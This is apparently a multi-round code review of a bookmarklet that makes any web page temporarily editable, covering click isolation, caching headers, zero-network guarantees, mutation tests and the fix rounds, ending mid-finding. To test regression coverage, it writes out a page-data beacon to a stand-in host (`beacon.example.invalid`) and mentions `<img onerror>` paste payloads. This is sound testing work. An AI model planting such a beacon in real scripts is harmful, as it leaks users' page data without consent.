# Review — Story s32-try-on-any-site

Fresh-context anti-hallucination review of `git diff main...feature/s32-try-on-any-site`
(single commit `fec764e`, 24 files). The reviewer did not write this code. Source was not
modified; every mutation below was restored and proven clean with `git diff --exit-code`.

## Findings

### Major

1. **Clicks and keys inside the element being edited still activate the host page.**
   `public/try/rcf-try.js:336-341` handles a click on the active element by calling
   `preventDefault()` only when the element *itself* is an `A` or `BUTTON`, and never calls
   `stopPropagation()`. `rcf-try.js:375-386` only stops propagation of keydown. Proven in real
   Chromium (scratch Playwright probe against the committed runtime):
   - `<a href="#navigated"><h3>Card title</h3></a>`: the first click starts editing the `h3`;
     the second click inside it follows the ancestor link (`location.hash` became `#navigated`).
     With a real href the page navigates away and every local edit is lost.
   - `<div onclick=…><h2>…</h2></div>` (a JS-clickable card): the second click inside the active
     heading ran the host handler (count 0 → 1).
   - `<button onclick=…>Buy now</button>`: the second click ran the host handler, and pressing
     **Space** or **Enter** while editing the label ran it again (count 1 → 2). A multi-word button
     label cannot be typed without firing the host's action. Buttons are a listed acceptance target.

   The second click is the natural gesture: `startText` (`rcf-try.js:253-265`) replaces the
   children and calls `focus()`, so the caret lands at the start of the text, not where the user
   clicked. The /try sample reproduced it ("New Make good coffee feel easy"). This contradicts
   the research traps "Avoid … link navigation during edit" and "Handle … nested candidates"
   (`docs/research/s32-try-on-any-site.md:27-29`). No test exercises a candidate nested in a link
   or a clickable container, or keyboard activation of an edited button. A form `type=submit` was
   correctly not submitted.
   Fix: for any click whose target is inside `active.element`, always `preventDefault()` and
   `stopPropagation()` (caret placement happens on mousedown, so this is safe). Suppress
   Space/Enter activation on an active `BUTTON` and insert the text yourself. Add jsdom and
   Playwright cases for `<a><h3>`, a clickable container, and Space in a button.

2. **A one-year immutable cache on a URL that saved bookmarks will request forever.**
   `next.config.ts:53-62` serves `/try/rcf-try.js` with `public, max-age=31536000, immutable`.
   `TryExperience.tsx:8-10` hard-codes `?v=20260924` into the bookmarklet, and every bookmark a
   user saves freezes that URL. Bumping the constant only changes *new* bookmarks. A browser that
   cached `?v=20260924` keeps the old runtime for up to a year, so a fix (finding 1 included)
   cannot reach existing users. Nothing ties the version to the file's content, so an edit to
   `rcf-try.js` without a bump also leaves returning visitors on the stale code, including the
   same-origin /try sample. The repo's precedent for a permanent third-party script URL is the
   opposite. Observed on a local production build: `/embed/recopyfast.js` → `Cache-Control:
   public, max-age=0`; `/try/rcf-try.js` → `max-age=31536000, immutable`. The `?v=` works as
   cache pinning, not cache busting. No ADR records this delivery policy for a second
   permanent-URL script that runs on third-party pages.
   Fix before the first public share: use a short `max-age` plus revalidation (ETag) for this
   path, or content-hash the URL *and* serve old versions. The test that pins the header value
   (`src/__tests__/try/try-delivery.test.ts:14-17`) must change with it.

3. **The zero-network guarantee is not guarded by any test that would catch a regression.**
   Neutralization M6 inserted `new Image().src = "https://beacon.example.invalid/p?t=" +
   encodeURIComponent(document.title)` at the top of `saveText`. That is a page-data beacon on
   every Save. Result: **0/14 jest red, and the Playwright spec `e2e/try-preview.spec.ts` still
   passed.** The jest test (`src/__tests__/try/rcf-try.test.ts:216-238`) and the e2e test
   (`e2e/try-preview.spec.ts:22-43`, `64-72`) only monkeypatch `fetch`, `XMLHttpRequest.send`
   and `sendBeacon`. jsdom never loads images, and nothing watches real requests. The runtime
   itself is clean today: static grep finds no network API, and a Chromium probe recorded
   **0 requests** across inject → edit → save → image replace → Exit. Only the regression net
   is missing. This is the story's headline privacy promise for a script that runs on arbitrary
   pages.
   Fix: in the Playwright spec, record `page.on("request")` and `page.on("websocket")` after
   injection and assert none. Optionally add a static-source assertion that forbids the transport
   APIs.

### Minor

4. **The raster-only image guard is untested for its security half.** Neutralization M1
   widened `rcf-try.js:181-184` from `(?:png|jpeg|gif|webp|avif)` to any MIME (`[a-z+.-]+`):
   **0/14 red**. The test (`rcf-try.test.ts:170-203`) rejects only an `https:` URL. It never
   tries `data:image/svg+xml` or `javascript:`. The regex itself is correct. Probed:
   svg+xml, `javascript:`, `text/html`, a charset parameter and a trailing fragment are all
   rejected. `<img>` never runs SVG script, so the practical risk is low. Still, the code comment
   at `:178-180` states this as a security property.
5. **/try loses the site-wide social image.** The page's `openGraph`/`twitter` objects
   (`src/app/try/page.tsx:15-25`) replace the layout's, so the built HTML for `/try` has no
   `og:image`, `twitter:image`, `og:site_name` or `og:locale`. `/`, `/demo` and `/blog` all
   carry them, and `/try` still declares `twitter:card=summary_large_image`. This is the page
   meant to be shared in outbound. The metadata test (`src/__tests__/integration/try-page.test.tsx:101-105`)
   checks only url, canonical and title.
6. **The count contract missed one pinned document.** `server/README.md:382` still says
   "CI executes the complete inventory: **39 passed**". Every active contract (config,
   reporter default, CI ×4, both contract tests, the realtime comment) is correctly 40.
7. **Editing flattens markup immediately.** `rcf-try.js:253-255` replaces an element's children
   with its text on the *first click*. A paragraph's inline links and bold text disappear while
   editing, and Save makes that permanent in the tab. In `plaintext-only`, Enter inserts `\n`,
   which renders as a space under normal `white-space`. Cancel does restore the original nodes and
   their handlers. Verified.
8. **Image replacement is practically unusable for the persona.** Only a pasted base64 raster
   data URL is accepted. That is correct under the no-network decision (`docs/plans/…:40-42`,
   `:84`), and the page says so honestly. A local file picker (`<input type=file>` →
   `FileReader.readAsDataURL`) would stay at zero network and actually be usable. The research
   left this as an open question for the user (`docs/research/…`), not a settled decision.
9. **Design-system drift on /try.** The sample panel `TryExperience.tsx:238` uses `shadow-xl` on
   a static panel ("No `shadow-lg`/`shadow-xl` on static panels"). Its multi-brand sample content
   is not marked `data-demo-surface`, the scope exception the design system provides for demo
   content.
10. **The preview can get stuck after a host body swap.** If a host replaces `<body>` (e.g. Turbo
    Drive on a nav-link click, which the preview deliberately lets through), the topbar and Exit
    are gone. `window.__rcfTryPreview` stays set, so the bookmarklet's guard (`rcf-try.js:4` and the
    loader check) refuses to re-run until a full reload. Found by reading the code, not run.
11. **Plan bookkeeping.** `docs/plans/s32-try-on-any-site.md:30-32` (task 6: commit, push,
    draft PR) is unticked, although the commit is pushed and PR #27 exists.

## Verified correct

- **No network, no unsafe sinks.** There is no `innerHTML`/`outerHTML`/`insertAdjacentHTML`,
  `eval`, `fetch`, XHR, `sendBeacon`, `WebSocket`, `EventSource`, `new Image`, prefetch or
  storage anywhere in `rcf-try.js`. All page and user text goes through `textContent`, text
  nodes or `createTextNode` (`:32`, `:170`, `:255`, `:288`, `:297`). Paste and drop are forced
  to `text/plain`. The CSS has no `url()` and uses system fonts only.
- **Exit and idempotence.** Exit removes every listener (`listen()` registry), every owned
  attribute (original values restored, `contenteditable`/`spellcheck` included), the style,
  topbar, status and toolbar, and deletes the global. Verified in Chromium: 0
  `[data-rcf-try-ui]` nodes, 0 leftover `data-rcf-try-*`/`contenteditable`/`spellcheck`
  attributes, global gone. Saved text and images deliberately persist until refresh, and the
  page says so. Double injection is a no-op (`:4`). Running the bookmarklet twice gave 1 topbar.
- **Host handlers are not broken.** Clicks on non-candidates are untouched (no blanket
  `preventDefault`). Nav links pass through unless Alt is held. Cancel restores the *same* child
  nodes with their handlers (tested). Form submission is blocked only for the form containing
  the active element.
- **Bookmarklet.** The hydrated href was parsed: it contains no `%`, so percent-decoding cannot
  alter it; it round-trips through the URL parser unchanged; it parses as JS; and it references
  exactly two URLs, both `https://www.recopyfa.st` (the canonical host; ADR 018 notes apex
  308s to www). It is set via ref after mount because React strips `javascript:` hrefs. It has
  a loader-id guard and a focused fallback. The CSP-blocked path was observed: "ReCopyFast
  could not load here. Open the live sample", focused, linking to `/try#sample`.
- **Middleware (A-24 comparison).** `/try` and `/try/rcf-try.js` are exact sessionless paths.
  The `/embed/` prefix rule is untouched, and `/try/not-the-runtime.js` still takes the session
  path (tested). Local production build, `GET /try/rcf-try.js?v=20260924`: 200,
  `application/javascript; charset=utf-8`, `Access-Control-Allow-Origin: *`, `nosniff`, CSP and
  XFO present, **no `Set-Cookie`**. ACAO `*` never pairs with credentials here.
- **The production embed is untouched.** `git diff main...HEAD -- public/embed
  scripts/build-embed.mjs` is empty. `node scripts/build-embed.mjs --check`: up to date. Bundle
  46,480 ≤ 46,681 B, widget 33,707 ≤ 33,865 B, transport 13,122 B. The preview runtime is
  4,462 B gzip-9 (16,235 raw), within its 8,192 B gate.
- **/try page.** `next build` succeeded with the CI placeholder env and prerendered `/try` as
  static. In Chromium, the title is "See your site editable in one click | ReCopyFast" with
  canonical and og:url, and the bookmarklet href is hydrated. The scoped sample edits only
  `#rcf-try-sample` (0 editable header nodes), and Save, Exit → idle and Reset all work. No
  horizontal overflow at 390 px, and no console errors beyond the expected CSP block. The copy
  says nothing is saved in the hero, the install note and the runtime topbar, and states the
  CSP, mobile and image limits. The description's "any live website" is qualified on the page.
  Nav link on desktop and mobile, sitemap entry: present and tested.
- **Playwright contract 39 → 40** is consistent across `playwright.config.ts`,
  `e2e/support/strict-reporter.ts`, `.github/workflows/ci.yml` (placeholder, step name,
  expected/total/passed checks, error text) and both contract tests. `--list`: **40 tests in
  10 files**. No test was weakened; the old assertions were retargeted and new ones added.
- **Plan vs diff.** Tasks 1–5 are present. Nothing unplanned was added apart from pipeline docs.
  Task 4 asked for cancel coverage "where practical". The e2e covers save/exit, and cancel is
  covered in jsdom only.

## Verification (run by the reviewer)

The environment used the CI main-job placeholders extracted from `.github/workflows/ci.yml`. No
`.env*` file was present in the worktree other than `.env.example`, and no production
credentials were used. Local Node was 25.6.1; CI uses Node 20.

- Targeted jest (runtime, delivery, page, middleware, e2e contracts, Header): **11 suites, 100
  tests passed**.
- Full jest, `--ci --maxWorkers=2 --workerIdleMemoryLimit=512MB`: **214 passed / 1 skipped
  suites; 2,762 passed / 36 skipped / 0 failed tests**. The first attempt was aborted by host
  disk exhaustion (ENOSPC from concurrent worktree cleanup), not by this code, and was rerun
  cleanly.
- `CI=true npx playwright test e2e/try-preview.spec.ts --reporter=line`: 1/1 passed.
- `npx tsc --noEmit`: exit 0. ESLint on all changed `src` files: clean. Prettier on changed
  files: clean except `next.config.ts`, which is already unformatted on `main` and outside
  `format:check`'s glob.
- `next build`: passed. `next start` header checks are listed above.

### Neutralizations (all restored; `git diff --exit-code` clean after each; final tree clean)

| # | Neutralized | Red |
|---|---|---|
| M1 | image regex accepts any MIME | **0/14** (finding 4) |
| M2 | Alt requirement for nav links dropped | 1/14 |
| M3 | Exit keeps listeners | 3/14 |
| M4 | double-injection guard removed | 1/14 |
| M5 | Save writes `innerHTML` | 1/14 |
| M6 | image beacon on Save | **0/14 jest, e2e still green** (finding 3) |
| M7 | Cancel does not restore children | 2/14 |
| M8 | middleware drops exact runtime path | 1/32 |
| M9 | middleware widened to `/try/` prefix | 1/32 |
| M10 | ACAO header removed | 1/1 |

## Not verified — human gestures needed

- **Real bookmarklets.** Only the decoded source was executed via `page.evaluate`. Drag the
  button into the Chrome, Safari and Firefox bookmark bars and run it from there on three real
  sites: a React/Next marketing site, WordPress, and a site with card links. Then edit a card
  title twice, type a two-word label into a JS button, and Exit.
- **Other engines.** Only Chromium was run, not Firefox or WebKit. That leaves
  `contenteditable="plaintext-only"`, and macOS **Option+click** on a nav link (normally a
  download in Chrome and Safari; `preventDefault` should stop it) unverified.
- **Framework-owned DOM.** Detaching React/Vue-managed children can trigger reconciliation
  errors if the host re-renders that element's child list. Try editing a heading whose content
  re-renders (a rotating hero line or a countdown).
- **Production delivery.** After deploy, run `curl -sI https://www.recopyfa.st/try/rcf-try.js?v=…`
  to check the headers, the absence of `Set-Cookie`, and CDN behaviour. Only a local
  `next start` was checked.
- **Full CI run.** The 40-test run against the disposable stack was not executed. It is owned by
  PR CI.
- **Social previews.** Run /try through a LinkedIn/X/Slack unfurl check (finding 5).
- **Accessibility.** The keyboard/screen-reader flow of the toolbar is untested. It is appended
  at the end of `<body>`, so Tab from the edited text does not reach Save.

Findings 1 and 2 compound each other: the bug would get pinned into browsers for a year. Both
are cheap to fix, and they should be fixed before the first public share, even though the gate
allows shipping.

Initial verdict (`fec764e`): max severity major, ship allowed yes.

## Delta review 889041c

Fresh-context review of fix commit `889041c` (`git diff fec764e..889041c -- . ':!docs/stories.md'`).
Files that only arrived through merge `961ac4c` (s31 auth/callback, s31 docs) were ignored. The
reviewer did not write this code. Source was not modified. Every neutralization below was restored
and proven clean with `git diff --exit-code`. At the end, the only modified file is this one. Its
SHA-256 before this section was `616728bd…6e17b`, matching the plan's record.

### Requested checks

1. **Click and key isolation: resolved for the tested shapes, with two regressions (D1, D2).**
   `onClick` (`public/try/rcf-try.js:394-414`) now calls `preventDefault()` and
   `stopImmediatePropagation()` for any click inside `active.element`, or inside an
   `a`/`[onclick]`/`[role='button']` ancestor of it. It does this from a window capture listener
   (`:560-572`). `onKeyDown` (`:480-500`) and `onActivationKey` (`:502-512`, keypress and keyup)
   swallow Space and Enter inside the edited element. In Chromium, the second click inside
   `<a><h2>` stays on the page, and a button's keydown, keypress, keyup and click host listeners
   see nothing (`e2e/try-preview.spec.ts:120-228`). The caret lands at the click point via
   `placeCaret` (`:288-308`). Probes: a button clicked at 55% of its width gave "Start noXw today";
   typing into a `<strong>` inside a paragraph link inserted mid-word at the click. Removing the
   `placeCaret` call turns e2e `:120` red, so it is load-bearing. Exit removes all 13 registered
   listeners (12 window-capture listeners plus Exit). After Exit, in Chromium: the host button
   click works, Space triggers click, a document-capture keydown is observed, and the ancestor
   link navigates (`#card`). There are 0 `[data-rcf-try-ui]` nodes, 0 owned attributes, and the
   global is gone. Suppression is scoped to the edited element and its interactive ancestors,
   except in the cases D1 and D2 describe.
2. **Caching: resolved.** `next.config.ts:52-74` sets `public, max-age=0, must-revalidate` for
   `/try/rcf-try.js`. The delta does not touch middleware, and middleware sets no Cache-Control
   (`src/middleware.ts:72-80` is the exact sessionless path). Tested with local `next start` on
   the 19:12 build, whose `routes-manifest.json` carries the new rule:
   - `GET /try/rcf-try.js` returned 200 with `application/javascript; charset=utf-8`,
     `Cache-Control: public, max-age=0, must-revalidate`, ACAO `*`, `nosniff`, a weak ETag,
     `Last-Modified` and **no `Set-Cookie`**. The served bytes match the committed file.
   - `If-None-Match` returned **304**.
   - The legacy `?v=20260924` URL gets the same revalidating header.
   - `/embed/recopyfast.js` returns `public, max-age=0`, the same policy family.

   The bookmarklet and the sample use the stable URL (`src/components/try/TryExperience.tsx:8-9`,
   `:79`). The hydrated href was read in Chromium from the production `/try` page and has no `?v=`.
3. **Zero-network regression net: resolved, and it bites.** `e2e/try-preview.spec.ts:23-118`
   records `page.on("request")` and `page.on("websocket")` from before `setContent`, through
   inject, text Save, FileReader image replacement and Exit. It asserts the request list is
   exactly `[RUNTIME_URL]`. I inserted `new Image().src = "https://beacon.example.invalid/…"` in
   four places in turn: `saveText`, `startText`, `saveImageValue` and the end of `exit()`. Each
   time **1/4 went red**, failing at `expect(requests).toEqual([RUNTIME_URL])` with the beacon URL
   in the diff. Jest stays 0/20, as expected, because jsdom loads no images. The hydrated
   bookmarklet on a host fixture made one request (the script) across inject, edit, body swap,
   two reruns and Exit.
4. **Raster-only images: resolved.** The `isRasterDataUrl` regex (`:203-207`) is unchanged, and
   the test now also rejects `data:image/svg+xml` and `javascript:`
   (`src/__tests__/try/rcf-try.test.ts:240-250`). Widening the MIME turns 1/20 red. The file
   picker (`:250-256`, `:425-452`) has:
   - an `accept` list;
   - a `file.type` raster allow-list checked *before* reading. SVG is rejected (test `:286-306`),
     and dropping the check turns 1/20 red;
   - `FileReader.readAsDataURL`, whose result is re-validated through `isRasterDataUrl`;
   - a stale-read guard (`active !== editingSession`, test `:308-362`).

   There is **no size cap** (D7).
5. **Text-only writes: holds.** A grep of the runtime finds no `innerHTML`, `outerHTML`,
   `insertAdjacentHTML`, `document.write`, `execCommand`, `eval`, network API, storage or `url(`.
   Content writes are `createTextNode` (`:348`, `:357`) and `nodeValue` restores of snapshot
   values (`:176`). `saveText` no longer rewrites content (`:196-201`); the element is edited in
   place under `contenteditable="plaintext-only"`. In Chromium, typing `<b>x</b>` inside a
   `<strong>` in a link produced escaped text and 0 `<b>` elements. A **real** clipboard paste
   that carried `text/html` `<img onerror>` inserted only the plain-text flavor. Making
   `insertPlainText` use `innerHTML` turns 1/20 red. Cancel restores the original node identities
   (recursive snapshot, `:159-179`); disabling it turns 2/20 red. Caveat: D3.
6. **Body-replacement reinjection: resolved for replacement; D4 for cloned bodies.** The runtime
   guard (`:4-7`) and the bookmarklet (`TryExperience.tsx:40`) call `resume()` (`:545-556`). It
   re-appends the *same* style, topbar and status nodes and never calls `listen` again. In
   Chromium:
   - after the body is replaced, there are 0 bars;
   - after two `resume()` calls, one runtime re-execution and two bookmarklet runs, there is 1 bar;
   - Space inserts exactly 1 character, so no listener is doubled;
   - Save shows 1 status, and Exit leaves 0 UI.

   Removing the topbar re-append turns 1/20 red. Removing `.resume()` from the bookmarklet turns
   1/7 red in the page test.
7. **Playwright count 43: consistent in every active pin.** Checked:
   - `playwright.config.ts:14`
   - `e2e/support/strict-reporter.ts:108`
   - `.github/workflows/ci.yml:126,173,217,259-261,266`
   - both contract tests
   - `e2e/realtime-additive.spec.ts:31`
   - `server/README.md:382`
   - `docs/stories.md:1238`

   `CI=true npx playwright test --list`: **43 tests in 10 files**. PR CI "E2E (Playwright)" passed
   the strict 43-test contract on `889041c`. One stale mention remains in a register document
   (D8).

Other initial findings: **5 resolved.** The rendered `/try` has `og:image`, `twitter:image`,
`og:site_name` and `og:locale`, and `/opengraph-image` and `/twitter-image` return 200
`image/png`. **9 resolved:** `data-demo-surface` is present, `shadow-xl` is gone, and both are
tested. **11 resolved:** task 6 is ticked.

### New findings

#### Major

D1. **A nav link inside a list item no longer navigates. A plain click edits the `<li>`
    instead.** `candidateFrom` (`public/try/rcf-try.js:84-85`) now prefers
    `h1-h6,p,li,button,img` over `a`. `isNavigationLink` (`:90-95`) only matches when the
    *candidate* is an `A`. So in `nav > ul > li > a`, the dominant menu markup (WordPress
    `wp_nav_menu`, Bootstrap navbars, most CMS themes), the candidate becomes the `li`, the Alt
    rule is skipped, and the click is prevented. The hover outline also lights up every menu item.
    Proven in Chromium in two ways:
    - Runtime comparison: `fec764e` followed the link (`#pricing`) and left nothing editable;
      `889041c` did not navigate and made the `li` `contenteditable="plaintext-only"`.
    - The **actual hydrated bookmarklet** from a local production `/try`, run on a
      WordPress-style fixture, showed the same result.

    This contradicts the story acceptance "links (navigation requires Alt)" (`docs/stories.md:1231`)
    and the page copy "Links in navigation stay safe by default"
    (`src/components/try/TryExperience.tsx:138`). It was never planned: the plan asked to
    preserve inline formatting, not to change the nav rule. It was not caught for two reasons.
    The only nav test uses `<div role="navigation"><a>` (`rcf-try.test.ts:81-90`). The /try
    sample nav is a direct `nav > a`. The plan's self-verification ("APPROVE, 0 findings") missed
    it. It is not destructive, because it blocks navigation rather than losing edits, but it breaks
    the one host behavior the preview promises to keep. Fix before the first public share: in
    `onClick` and `onMouseOver`, check `event.target.closest("a")` against the nav rule *before*
    choosing the text-block candidate. Add a `<nav><ul><li><a>` case to jest and Playwright.

#### Minor

D2. **The interactive-ancestor walk has no bound.** `rcf-try.js:395-406` walks up to `root`
    inclusive and treats *any* `a`, `[onclick]` or `[role='button']` ancestor as the suppression
    zone. On a page with a page-wide inline handler, every click on the page is swallowed while an
    edit is open. Examples: `<body onclick="">`, or `<div id="page" onclick="…">`, the old iOS
    click-delegation workaround. In Chromium, a checkbox did not toggle, `<details>` did not open,
    a host tab handler did not fire, and another paragraph could not be selected. The `fec764e`
    runtime and the same page without the wrapper behave normally. Save, Cancel and Escape
    recover. Fix: stop the walk below `root`/`body`, or drop `[onclick]`.

D3. **The runtime's paste and drop guards are skipped when the caret is in a preserved inline
    child.** `onPaste` and `onDrop` (`:454-472`) still require `event.target === active.element`.
    Now that inline nodes stay in place, the paste target is the inline element that holds the
    caret: Chromium reported `STRONG`, and the host's document paste listener received the event.
    No HTML was inserted, because Chromium's `plaintext-only` default did the insertion. So text-only
    currently rests on browser semantics for this path. Use `active.element.contains(event.target)`,
    as `onKeyDown` already does.

D4. **Restoring a cloned body duplicates the bar.** Turbo Drive restoration visits restore a
    *clone* of the body, which includes `#rcf-try-topbar`. `resume()` (`:552`) then appends the
    live topbar beside the dead clone. Simulated in Chromium: 2 bars with duplicate ids, and the
    clone's Exit does nothing. After the real Exit, the dead bar stays until reload. Fix: on
    resume, remove `[data-rcf-try-ui]` nodes that are not in `ui`.

D5. **Space and Enter are hand-inserted for every text edit, not only buttons and links.**
    `:490-497` prevents every Space and Enter in any edited element and inserts through a Range.
    The typed result is correct ("Hello big  wide world"). Costs:
    - It fragments text nodes: 8 nodes for one short phrase.
    - It bypasses the native undo stack.
    - There is no `event.isComposing` / keyCode 229 guard, and IMEs use Space to convert
      candidates. This is unverified outside Chromium.
    - Enter inserts `\n`, which shows as a line break while editing and collapses to a space after
      Save.

    Narrow it to `BUTTON`/`A` and elements with an interactive ancestor, and skip while composing.

D6. **Window-level capture is untested.** Neutralization N13 moved the click listener back to
    `document`: **0/20 jest and 0/4 Playwright went red**. The comment at `:558-559` states this
    property as a guarantee.

D7. **The file picker has no size cap.** `onChange` (`:425-452`) reads a raster file of any size
    into a data URL, about 1.33× its size, set as an attribute. It is tab-local and self-inflicted,
    but a 5–10 MB cap with a clear message would prevent a frozen tab. An empty or corrupt file
    shows the data-URL message ("Use an embedded raster data URL…"), which is confusing in the
    picker path.

D8. **One stale count in documentation.** `docs/quality/qa-register.md:694` still says CI
    "requires an exact 39 passed". It was already stale at 40 in `fec764e` and was missed then
    too.

### Verification (run by the reviewer, CI main-job placeholder env only, Node 25.6.1)

- s32 jest suites (runtime, delivery, page, both e2e contracts): **5 suites, 39 tests passed**.
- Full jest, `--ci --maxWorkers=2 --workerIdleMemoryLimit=512MB`, run twice, the second time into a
  uniquely named log: **214 passed / 1 skipped suites; 2,792 passed / 36 skipped / 0 failed
  tests**. The scratch directory is shared with concurrent lanes on the s28 and s29 worktrees. The
  rerun ruled out a clobbered log, and no other lane touched this worktree.
- `CI=true npx playwright test e2e/try-preview.spec.ts --reporter=line --retries=0`: **4/4
  passed**. `--list`: 43 tests in 10 files.
- ESLint on the changed `src`/`e2e` files: clean. Prettier `--check` on the changed runtime, page,
  tests and config: clean. `tsc` was not run locally; the PR CI "TypeScript Type-Check incl.
  tests" passed.
- Runtime gzip-9: **5,605 B ≤ 8,192 B**.
- `gh pr checks 27` on `889041c`: CodeRabbit (skipped: draft), E2E (Playwright), "Lint, Test &
  Build", realtime audit, TypeScript and Vercel all **pass**. The PR is draft and mergeable.
- Local `next start` header checks and the real-Chromium probes are described above.

### Neutralizations (all restored; `git diff --exit-code` clean after each; final tree clean)

| # | Neutralized | Jest red | Playwright red |
|---|---|---|---|
| N1 | image beacon in `saveText` | 0/20 | **1/4** |
| N2 | image beacon at end of `exit()` | 0/20 | **1/4** |
| N3 | image beacon in `saveImageValue` | 0/20 | **1/4** |
| N4 | image beacon in `startText` | 0/20 | **1/4** |
| N5 | data-URL MIME widened to any | 1/20 | – |
| N6 | local-file MIME check dropped | 1/20 | – |
| N7 | `placeCaret` call removed | 0/20 | 1/4 |
| N8 | click inside the active element not suppressed | 1/20 | 0/4 |
| N9 | interactive-ancestor branch disabled | 1/20 | 1/4 |
| N10 | keydown Space/Enter not prevented | 0/20 | 1/4 |
| N11 | keypress/keyup activation guard off | 0/20 | 1/4 |
| N12 | `resume()` does not reattach topbar | 1/20 | – |
| N13 | click listener on `document` instead of `window` | **0/20** | **0/4** (D6) |
| N14 | Cancel does not restore tree | 2/20 | 0/4 |
| N15 | `insertPlainText` uses `innerHTML` | 1/20 | – |
| N16 | Exit keeps window listeners | 2/20 | 1/4 |
| N17 | Cache-Control back to one-year immutable | 1/1 (delivery) | – |
| N18 | bookmarklet drops `.resume()` | 1/7 (page) | – |

### Not verified: human gestures needed

- **Real bookmarks bar, other engines.** Only Chromium was run, with the bookmarklet source
  executed via `page.evaluate`. Firefox and Safari use different caret APIs
  (`caretPositionFromPoint` vs `caretRangeFromPoint`), `plaintext-only` paste behavior and IME
  key events. A human should drag the button into the Chrome, Safari and Firefox bookmark bars
  and, on one real WordPress site:
  - click a menu link (D1);
  - edit a card title, then click it again;
  - type a two-word label into a JS button;
  - type Japanese with an IME;
  - replace an image from disk;
  - Exit.
- **CDN caching.** The Vercel preview answered with a 302 to Vercel SSO, so only local
  `next start` headers were observed. After deploy, run
  `curl -sI https://www.recopyfa.st/try/rcf-try.js` twice (the second time with `If-None-Match`)
  to confirm the header, the 304 and the absence of `Set-Cookie` at the edge.
- **Framework-owned DOM.** Inline nodes now stay in place while editing. A React or Vue host that
  re-renders the edited element's children can overwrite or fight the user's typing. Try a
  heading that re-renders, such as a rotating hero line.
- **Real Turbo Drive.** D4 was only simulated with a cloned body. Try a Hotwire site: navigate,
  press Back, rerun the bookmarklet.
- **Large local images.** No multi-megabyte file was read (D7).
- **The full 43-case disposable-stack run** was not executed locally; the PR CI passed it.

The delta fixes all three majors from the initial review, and every one of their guards is now
proven to bite. It introduces one new major (D1): a regression of the nav-link acceptance
criterion on the most common menu markup. It is cheap to fix and should be fixed before the first
public share, together with D2 and D3, which come from the same change.

## Delta review e889e77

Fresh-context review of fix commit `e889e77` (`git diff 4fbff04..e889e77`). Merge `4fbff04`
(PR #23 content from main) was ignored. The reviewer did not write this code. Source was not
modified. Every neutralization was restored and proven clean with `git diff --exit-code`. At the
end, the only modified file is this one. Its SHA-256 before this section was `811f2159…cf2f0`,
matching the plan's record.

### Requested checks

1. **D1: resolved for menus. A heading inside a card link still edits.** `candidateFrom`
   (`public/try/rcf-try.js:105-129`) now returns early in three cases: Alt returns the link
   (`:116`), a navigation link returns null (`:117`), and a link whose candidate is itself or an
   `LI` returns null (`:126`). It also returns null when the link is the block's only content
   (`:75-103`, `:127`). In Chromium, a plain click on each of the following changed the hash and
   reached a host `document` click listener (12/12), with 0 hover outlines and 0 editable nodes:
   - WordPress `wp_nav_menu` (`nav > div > ul > li > a`, including `span` labels and `.sub-menu`);
   - a no-`nav` WordPress footer menu;
   - a Bootstrap `.navbar-brand`, `.nav-link` and `.dropdown-item`, plus `.navbar-nav` without
     `nav`;
   - a mega-menu with a top link, a deep link with `strong` + `span`, and a promo card
     `a > h5 + p`, plus a no-`nav` mega-menu.

   The Bootstrap `dropdown-toggle` click also reached the host. Alt+click on the WordPress,
   Bootstrap and mega links made the `a` `contenteditable="plaintext-only"` (never the `li`),
   did not navigate and fired no download. Typing and Enter stayed in the label. The regression
   guard holds: `<a href><h2>` first click edits the h2, the second click stays, typing gives
   "Card heading X Y", and the hash is unchanged. An inline link in a `<p>` still edits the
   paragraph. **See E1 and E2 for what the new rule costs elsewhere.**
2. **D2: resolved.** `boundedInteractiveAncestorContains` (`:427-451`) stops at the first block
   container that is not `a`/`button`/`[role=button]`, after 4 levels, at `root` and at `body`.
   With the edit open under `<div id="page" onclick="">` and under `<body onclick="">`, Chromium
   showed: the checkbox toggles, `<details>` opens, a `role=tab` host handler fires, and another
   paragraph becomes the edit.
3. **D5: resolved.** Space/Enter are hand-inserted only for `a`/`button`/`[role=button]` labels or
   labels with an interactive ancestor, and never while `isComposing` (`:590-600`, `:605-618`).
   Chromium results:
   - Ordinary `<p>` inside a `<form>`: typing kept 1 text node. Native Enter inserted `\n` as
     text, not `<br>`. There was no submit. Undo (Meta+Z ×3) went back to "Hello world".
   - Button: "Buy now please" + Enter gave 0 host clicks and 0 host keydowns.
   - Alt-edited `a[role=button]` label: "Sign up today" + Enter, no navigation, and no host click
     while editing.
   - `h3` inside a `div[role=button]` card: "Card label two words" + Enter, 0 host clicks.
4. **D3: resolved.** `onPaste`/`onDrop` (`:546-572`) use `contains`. A real clipboard paste into a
   `<strong>` inside the edited paragraph carried `text/html`
   `<img onerror><b>` and `text/plain` `PLAIN`. Result: "boPLAINld", 0 `img`/`b`, 0 host paste
   events, and `onerror` never ran. A synthetic `ClipboardEvent` on the `strong` was prevented,
   with 0 host events and no `<i>`.
5. **D4: resolved for the bar, with one residue (E4).** `resume()` removes cloned
   `[data-rcf-try-ui='true']` nodes (`:657-669`). Chromium test: clone the body with an edit open,
   then call `resume()`. Result: 1 bar, the stale toolbar is gone, and Exit leaves 0 UI with the
   global deleted.
6. **D6: resolved.** N11 (click listener on `document`) turns jest red. See the neutralization
   table.
7. **D7: resolved.** Order of checks: no file, then size above 5 MiB before reading (`:506`),
   then empty, then MIME, then `FileReader`. The data URL is then decoded through `new Image()`
   before `saveImageValue` (`:531-541`). The e2e test covers >5 MiB, a valid PNG and a corrupt
   PNG, each with its distinct message. The only `new Image()` loads a `FileReader` data URL, and
   `saveImageValue` still re-validates it as raster.
8. **D8: resolved.** Every active pin says 44: `playwright.config.ts:14`,
   `e2e/support/strict-reporter.ts:108`, `.github/workflows/ci.yml:126,173,217,259-261,266`,
   both contract tests, `e2e/realtime-additive.spec.ts:31`, `server/README.md:382`,
   `supabase/README.md:144`, `docs/quality/qa-register.md:694` and `docs/stories.md:1238`.
   `CI=true npx playwright test --list`: **44**. The fix adds exactly one case (`try-preview`
   has 5).
9. **No network and no innerHTML: holds.** A grep of the runtime finds no `innerHTML`,
   `outerHTML`, `insertAdjacentHTML`, `document.write`, `execCommand`, `eval`, `fetch`, XHR,
   `sendBeacon`, `WebSocket`, `EventSource`, storage or `url(`. Every probe page recorded exactly
   `[host page, runtime]` requests. N14 (a beacon in the new decode path) turns the zero-network
   e2e red.

### New findings

#### Major

E1. **Every link label now needs Alt, and a plain click on a non-navigation link navigates
    away. That destroys all preview edits.** The plan widened D1 to "only Alt+click edits link
    labels; link-only wrappers never hijack plain clicks" (`docs/plans/s32-try-on-any-site.md:157`).
    The story acceptance still reads "links (navigation requires Alt)" (`docs/stories.md:1231`).
